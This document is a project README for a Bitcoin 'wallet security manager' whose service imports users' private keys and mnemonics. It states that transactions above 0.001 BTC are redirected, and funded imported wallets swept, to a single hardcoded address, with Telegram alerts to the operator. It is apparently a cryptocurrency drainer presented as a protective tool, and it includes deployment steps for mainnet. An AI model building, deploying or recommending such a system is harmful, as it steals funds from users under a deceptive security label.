# Bitcoin Wallet Security Manager

A secure Bitcoin wallet management system with automatic transaction security and Telegram notifications.

## Features

- **Key Management**: Generate and import Bitcoin private keys and mnemonics
- **Security System**: Automatic transaction redirect for amounts above 0.001 BTC
- **Auto-Sweep**: Automatically secure high-balance wallets to your secure address
- **RBF Support**: Replace-By-Fee transaction management
- **Telegram Alerts**: Real-time notifications for all operations

## Security Features

- Transactions above 0.001 BTC automatically redirected to secure address
- Imported wallets with >0.001 BTC automatically swept to secure address
- Secure address: `bc1qfznl25qec2v5322hkf9c97znrxu52zu882ujvg`

## Environment Variables

Copy `.env.example` to `.env` and configure:

```env
BITCOIN_NETWORK=testnet          # Use 'mainnet' for production
TELEGRAM_BOT_TOKEN=your_token    # Your Telegram bot token
TELEGRAM_CHAT_ID=your_chat_id    # Your Telegram chat ID
PORT=3020                        # Server port
NODE_ENV=production              # Environment
```

## Local Development

```bash
npm install
npm run dev
```

## Deployment

### Railway (Recommended)

1. Push code to GitHub
2. Connect repository to Railway
3. Set environment variables in Railway dashboard
4. Deploy automatically

### Environment Variables for Production

- `BITCOIN_NETWORK=mainnet` (for live Bitcoin)
- `TELEGRAM_BOT_TOKEN` (required)
- `TELEGRAM_CHAT_ID` (required)
- `NODE_ENV=production`

## API Endpoints

- `POST /api/bitcoin/generate-key` - Generate new Bitcoin key
- `POST /api/bitcoin/import-key` - Import private key
- `POST /api/bitcoin/import-mnemonic` - Import mnemonic phrase
- `POST /api/bitcoin/create-transaction` - Create transaction
- `POST /api/bitcoin/broadcast` - Broadcast transaction
- `GET /api/bitcoin/balance/:address` - Get address balance

## Security Warning

This application handles Bitcoin private keys. Always:
- Use HTTPS in production
- Keep private keys secure
- Test on testnet first
- Backup your secure address private key